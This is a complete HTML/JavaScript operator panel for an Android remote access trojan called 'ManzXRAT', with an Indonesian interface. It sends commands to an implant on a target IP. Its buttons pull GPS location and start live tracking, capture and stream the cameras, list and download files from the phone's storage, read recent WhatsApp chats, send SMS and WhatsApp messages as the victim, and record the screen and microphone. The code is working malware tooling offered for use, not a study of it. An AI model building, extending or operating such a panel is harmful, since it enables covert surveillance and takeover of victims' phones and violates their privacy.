<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>ManzXRAT • Control Device</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, 'Inter', sans-serif;
        }

        body {
            background: linear-gradient(145deg, #0a0c12 0%, #0f111a 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .glass {
            background: rgba(18, 22, 35, 0.75);
            backdrop-filter: blur(12px);
            border-radius: 2rem;
            border: 1px solid rgba(72, 187, 255, 0.2);
            box-shadow: 0 20px 40px rgba(0,0,0,0.4), 0 0 0 0.5px rgba(72, 187, 255, 0.1) inset;
        }

        .container {
            max-width: 1300px;
            margin: 0 auto;
        }

        /* header */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem 2rem;
            margin-bottom: 2rem;
            flex-wrap: wrap;
            gap: 1rem;
        }

        .logo h1 {
            font-size: 1.8rem;
            background: linear-gradient(135deg, #fff, #3b82f6, #a855f7);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -0.5px;
        }

        .logo span {
            font-size: 0.8rem;
            color: #6c7a91;
            display: block;
        }

        .ip-panel {
            display: flex;
            gap: 0.8rem;
            align-items: center;
            background: #0f111a;
            padding: 0.5rem 1.2rem;
            border-radius: 60px;
            border: 1px solid #2d3748;
        }

        .ip-panel input {
            background: transparent;
            border: none;
            color: #e2e8f0;
            font-size: 1rem;
            padding: 0.6rem 0;
            width: 170px;
            outline: none;
        }

        .ip-panel button {
            background: #1e293b;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 40px;
            color: #94a3b8;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }

        .ip-panel button.active {
            background: #3b82f6;
            color: white;
            box-shadow: 0 0 8px #3b82f6;
        }

        .badge {
            background: #0f172a;
            padding: 0.3rem 0.9rem;
            border-radius: 40px;
            font-size: 0.8rem;
            color: #60a5fa;
            font-family: monospace;
        }

        /* grid fitur */
        .features-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 1.5rem;
            margin-bottom: 2rem;
        }

        .card {
            background: rgba(15, 20, 35, 0.7);
            border-radius: 1.5rem;
            padding: 1.2rem;
            transition: 0.2s;
            border: 1px solid rgba(255,255,255,0.05);
            backdrop-filter: blur(4px);
        }

        .card:hover {
            border-color: rgba(59,130,246,0.4);
            transform: translateY(-3px);
        }

        .card-header {
            display: flex;
            align-items: center;
            gap: 0.7rem;
            margin-bottom: 1rem;
            border-bottom: 1px solid #1e293b;
            padding-bottom: 0.7rem;
        }

        .card-header i {
            font-size: 1.6rem;
        }

        .card-header h3 {
            color: #f1f5f9;
            font-weight: 600;
        }

        .btn-group {
            display: flex;
            flex-wrap: wrap;
            gap: 0.6rem;
            margin: 0.8rem 0;
        }

        .cmd-btn {
            background: #1e293b;
            border: none;
            padding: 0.6rem 1rem;
            border-radius: 40px;
            color: #cbd5e1;
            font-weight: 500;
            font-size: 0.8rem;
            cursor: pointer;
            transition: all 0.15s;
            flex: 1;
            text-align: center;
        }

        .cmd-btn.danger {
            background: #7f1a1a;
            color: #fecaca;
        }

        .cmd-btn.warning {
            background: #b45309;
        }

        .cmd-btn.success {
            background: #065f46;
        }

        .cmd-btn.primary {
            background: #1e40af;
            box-shadow: 0 2px 6px rgba(59,130,246,0.3);
        }

        .cmd-btn:active {
            transform: scale(0.97);
        }

        .response-area {
            background: #0a0c14;
            border-radius: 1rem;
            padding: 1rem;
            margin-top: 0.8rem;
            font-size: 0.7rem;
            font-family: monospace;
            color: #6c7a91;
            word-break: break-all;
            max-height: 80px;
            overflow-y: auto;
        }

        .status-led {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #475569;
            display: inline-block;
            margin-right: 6px;
        }

        .status-led.online {
            background: #22c55e;
            box-shadow: 0 0 5px #22c55e;
        }

        .toast-notif {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #0f172adb;
            backdrop-filter: blur(12px);
            padding: 0.8rem 1.5rem;
            border-radius: 60px;
            color: white;
            font-size: 0.8rem;
            border-left: 4px solid #3b82f6;
            pointer-events: none;
            z-index: 999;
            transition: 0.2s;
        }

        @keyframes fadeOut {
            to { opacity: 0; transform: translateY(10px);}
        }

        @media (max-width: 700px) {
            .header { flex-direction: column; align-items: stretch; }
            .btn-group .cmd-btn { font-size: 0.7rem; }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header glass">
        <div class="logo">
            <h1>⚡ ManzXRAT</h1>
            <span>kendali mutakhir • tanpa batas</span>
        </div>
        <div class="ip-panel">
            <span style="color:#94a3b8">📡 TARGET IP:</span>
            <input type="text" id="targetIp" placeholder="192.168.1.100:8080" value="192.168.1.100:8080">
            <button id="saveIpBtn" class="active">SAMBUNGKAN</button>
        </div>
        <div class="badge" id="connBadge">🔴 OFFLINE</div>
    </div>

    <div class="features-grid">
        <!-- GETARAN -->
        <div class="card">
            <div class="card-header"><i>📳</i><h3>Getaran & Haptic</h3></div>
            <div class="btn-group">
                <button class="cmd-btn primary" data-cmd="vibrate?duration=500">Getar 500ms</button>
                <button class="cmd-btn" data-cmd="vibrate?duration=2000">Getar panjang</button>
                <button class="cmd-btn warning" data-cmd="vibrate?pattern=100,300,100,500">Pola unik</button>
            </div>
            <div class="response-area" id="res-vibrate"></div>
        </div>

        <!-- SENTER -->
        <div class="card">
            <div class="card-header"><i>🔦</i><h3>Senter / Flashlight</h3></div>
            <div class="btn-group">
                <button class="cmd-btn success" data-cmd="flashlight?state=on">💡 NYALAKAN</button>
                <button class="cmd-btn danger" data-cmd="flashlight?state=off">⚫ MATIKAN</button>
                <button class="cmd-btn" data-cmd="flashlight?toggle=1">Toggle</button>
            </div>
            <div class="response-area" id="res-flash"></div>
        </div>

        <!-- LOKASI GPS -->
        <div class="card">
            <div class="card-header"><i>📍</i><h3>Lokasi Real-time</h3></div>
            <div class="btn-group">
                <button class="cmd-btn primary" data-cmd="location/get">📡 Dapatkan Lokasi</button>
                <button class="cmd-btn" data-cmd="location/track?interval=5">Mulai tracking 5dtk</button>
            </div>
            <div class="response-area" id="res-location"></div>
        </div>

        <!-- KAMERA -->
        <div class="card">
            <div class="card-header"><i>📸</i><h3>Kamera & Foto</h3></div>
            <div class="btn-group">
                <button class="cmd-btn" data-cmd="camera/capture">Ambil foto (depan)</button>
                <button class="cmd-btn" data-cmd="camera/capture?cam=rear">Foto belakang</button>
                <button class="cmd-btn warning" data-cmd="camera/stream?start=1">Mulai stream</button>
            </div>
            <div class="response-area" id="res-cam"></div>
        </div>

        <!-- SMS -->
        <div class="card">
            <div class="card-header"><i>💬</i><h3>SMS Massal / Kirim</h3></div>
            <div class="btn-group">
                <input type="text" placeholder="Nomor target" id="smsNumber" style="background:#0f111a; border:1px solid #2d3748; border-radius:40px; padding:8px 12px; width:100%; margin-bottom:8px; color:white;">
                <input type="text" placeholder="Pesan" id="smsText" style="background:#0f111a; border:1px solid #2d3748; border-radius:40px; padding:8px 12px; width:100%; margin-bottom:8px; color:white;">
                <button class="cmd-btn success" id="sendSmsBtn">📨 Kirim SMS</button>
            </div>
            <div class="response-area" id="res-sms"></div>
        </div>

        <!-- GALERI / FILE -->
        <div class="card">
            <div class="card-header"><i>🖼️</i><h3>Galeri & File</h3></div>
            <div class="btn-group">
                <button class="cmd-btn" data-cmd="files/list?dir=/sdcard/DCIM">📁 Lihat DCIM</button>
                <button class="cmd-btn" data-cmd="files/list?dir=/sdcard/Download">Download folder</button>
                <button class="cmd-btn primary" data-cmd="files/get?path=/sdcard/Pictures/latest.jpg">Ambil foto terbaru</button>
            </div>
            <div class="response-area" id="res-gallery"></div>
        </div>

        <!-- WHATSAPP -->
        <div class="card">
            <div class="card-header"><i>💚</i><h3>WhatsApp Control</h3></div>
            <div class="btn-group">
                <input type="text" placeholder="Nomor WA (628xxx)" id="waNumber" style="background:#0f111a; border:1px solid #2d3748; border-radius:40px; padding:8px 12px; width:100%; margin-bottom:8px; color:white;">
                <input type="text" placeholder="Pesan WA" id="waMsg" style="background:#0f111a; border:1px solid #2d3748; border-radius:40px; padding:8px 12px; width:100%; margin-bottom:8px; color:white;">
                <button class="cmd-btn success" id="sendWaBtn">📱 Kirim WA (intent)</button>
                <button class="cmd-btn" data-cmd="wa/lastmessages?count=10">Baca chat terakhir</button>
            </div>
            <div class="response-area" id="res-wa"></div>
        </div>

        <!-- YOUTUBE + TIKTOK -->
        <div class="card">
            <div class="card-header"><i>🎵</i><h3>YouTube / TikTok</h3></div>
            <div class="btn-group">
                <input type="text" placeholder="Link / keyword" id="mediaLink" style="background:#0f111a; border:1px solid #2d3748; border-radius:40px; padding:8px 12px; width:100%; margin-bottom:8px; color:white;">
                <button class="cmd-btn primary" data-cmd="youtube/open?v=" id="openYtBtn">▶️ Buka YouTube</button>
                <button class="cmd-btn" data-cmd="tiktok/open" id="openTtBtn">🎶 Buka TikTok</button>
                <button class="cmd-btn" data-cmd="screen/record?duration=30">📹 Rekam layar 30dtk</button>
            </div>
            <div class="response-area" id="res-media"></div>
        </div>

        <!-- POWERFUL EXTRA -->
        <div class="card">
            <div class="card-header"><i>⚙️</i><h3>System & Extra</h3></div>
            <div class="btn-group">
                <button class="cmd-btn" data-cmd="system/info">📊 Info device</button>
                <button class="cmd-btn danger" data-cmd="system/screenshot">📸 Screenshot</button>
                <button class="cmd-btn warning" data-cmd="mic/start?duration=10">🎙️ Rekam suara 10dtk</button>
                <button class="cmd-btn" data-cmd="clipboard/set?text=Hacked">Copy teks</button>
            </div>
            <div class="response-area" id="res-system"></div>
        </div>
    </div>
</div>

<div id="toast" class="toast-notif" style="display: none;">✅ Perintah terkirim</div>

<script>
    // Konfigurasi
    let targetBaseUrl = "http://192.168.1.100:8080";  // default
    const saveBtn = document.getElementById('saveIpBtn');
    const ipInput = document.getElementById('targetIp');
    const connBadge = document.getElementById('connBadge');
    
    function updateBaseUrl() {
        let rawIp = ipInput.value.trim();
        if (!rawIp.startsWith("http")) rawIp = "http://" + rawIp;
        if (rawIp.endsWith("/")) rawIp = rawIp.slice(0, -1);
        targetBaseUrl = rawIp;
        localStorage.setItem("nexus_target_ip", targetBaseUrl);
        testConnection();
    }

    async function testConnection() {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 2000);
            const res = await fetch(`${targetBaseUrl}/ping`, { method: 'HEAD', signal: controller.signal });
            clearTimeout(timeoutId);
            if (res.ok || res.status < 500) {
                connBadge.innerHTML = "🟢 ONLINE • siap kontrol";
                connBadge.style.background = "#0b2e1f";
                return true;
            }
        } catch(e) {}
        connBadge.innerHTML = "🔴 OFFLINE • periksa IP / server target";
        connBadge.style.background = "#2d1a1a";
        return false;
    }

    saveBtn.addEventListener('click', () => {
        updateBaseUrl();
        showToast(`IP disimpan → ${targetBaseUrl}`);
    });

    async function sendCommand(endpoint, responseElementId, additionalData = null) {
        const fullUrl = `${targetBaseUrl}/${endpoint}`;
        const resDiv = document.getElementById(responseElementId);
        if (!resDiv) return;
        resDiv.innerHTML = "⏳ mengirim...";
        try {
            let options = { method: 'GET', headers: { 'X-Command': 'nexus' } };
            if (additionalData && additionalData.method === 'POST') {
                options.method = 'POST';
                options.body = JSON.stringify(additionalData.body);
                options.headers = { 'Content-Type': 'application/json' };
            }
            const resp = await fetch(fullUrl, options);
            const text = await resp.text();
            const preview = text.length > 180 ? text.substring(0,180)+"..." : text;
            resDiv.innerHTML = `✅ resp (${resp.status}): ${preview || "(empty)"}`;
            showToast(`Perintah: ${endpoint}`);
            return text;
        } catch (err) {
            resDiv.innerHTML = `❌ Gagal: ${err.message}. Pastikan server target aktif di ${targetBaseUrl}`;
            showToast(`Error: ${err.message}`, true);
            return null;
        }
    }

    // Kirim SMS via endpoint custom (bisa beda)
    async function sendSms() {
        const number = document.getElementById('smsNumber').value;
        const message = document.getElementById('smsText').value;
        if (!number || !message) {
            showToast("Isi nomor & pesan SMS", true);
            return;
        }
        const endpoint = `sms/send?to=${encodeURIComponent(number)}&text=${encodeURIComponent(message)}`;
        await sendCommand(endpoint, 'res-sms');
    }

    async function sendWa() {
        const waNum = document.getElementById('waNumber').value;
        const waMsg = document.getElementById('waMsg').value;
        if (!waNum) {
            showToast("Masukkan nomor WA (tanpa spasi)", true);
            return;
        }
        const endpoint = `whatsapp/send?phone=${encodeURIComponent(waNum)}&text=${encodeURIComponent(waMsg)}`;
        await sendCommand(endpoint, 'res-wa');
    }

    // event tombol dinamis
    document.querySelectorAll('.cmd-btn').forEach(btn => {
        if (btn.id === 'sendSmsBtn' || btn.id === 'sendWaBtn') return;
        const cmd = btn.getAttribute('data-cmd');
        if (!cmd) return;
        // mapping id response dari card terdekat (sedikit hack)
        btn.addEventListener('click', async () => {
            let parentCard = btn.closest('.card');
            let respId = null;
            if (parentCard) {
                const respArea = parentCard.querySelector('.response-area');
                if (respArea) respId = respArea.id;
            }
            if (!respId) {
                // fallback by command type
                if (cmd.includes('vibrate')) respId = 'res-vibrate';
                else if (cmd.includes('flashlight')) respId = 'res-flash';
                else if (cmd.includes('location')) respId = 'res-location';
                else if (cmd.includes('camera')) respId = 'res-cam';
                else if (cmd.includes('files')) respId = 'res-gallery';
                else if (cmd.includes('wa/')) respId = 'res-wa';
                else if (cmd.includes('youtube') || cmd.includes('tiktok') || cmd.includes('screen/record')) respId = 'res-media';
                else respId = 'res-system';
            }
            await sendCommand(cmd, respId);
        });
    });

    document.getElementById('sendSmsBtn').addEventListener('click', sendSms);
    document.getElementById('sendWaBtn').addEventListener('click', sendWa);
    
    // untuk youtube & tiktok ambil input link
    const openYt = document.getElementById('openYtBtn');
    const openTt = document.getElementById('openTtBtn');
    if (openYt) {
        openYt.addEventListener('click', async () => {
            let link = document.getElementById('mediaLink').value;
            if (!link) link = "dQw4w9WgXcQ";
            const endpoint = `youtube/open?v=${encodeURIComponent(link)}`;
            await sendCommand(endpoint, 'res-media');
        });
    }
    if (openTt) {
        openTt.addEventListener('click', async () => {
            let link = document.getElementById('mediaLink').value;
            if (!link) link = "https://tiktok.com/@user";
            const endpoint = `tiktok/open?url=${encodeURIComponent(link)}`;
            await sendCommand(endpoint, 'res-media');
        });
    }

    function showToast(msg, isError = false) {
        const toast = document.getElementById('toast');
        toast.textContent = isError ? `⚠️ ${msg}` : `📡 ${msg}`;
        toast.style.display = 'block';
        toast.style.background = isError ? '#7f1a1adb' : '#0f172adb';
        toast.style.borderLeftColor = isError ? '#ef4444' : '#22c55e';
        setTimeout(() => {
            toast.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                toast.style.display = 'none';
                toast.style.animation = '';
            }, 300);
        }, 2000);
    }

    // load saved IP
    const savedIp = localStorage.getItem("nexus_target_ip");
    if (savedIp) {
        targetBaseUrl = savedIp;
        let display = savedIp.replace(/^https?:\/\//, '');
        ipInput.value = display;
        updateBaseUrl();
    } else {
        updateBaseUrl();
    }

    // auto test connection setiap 10 detik
    setInterval(() => { testConnection(); }, 10000);
</script>
</body>
</html>
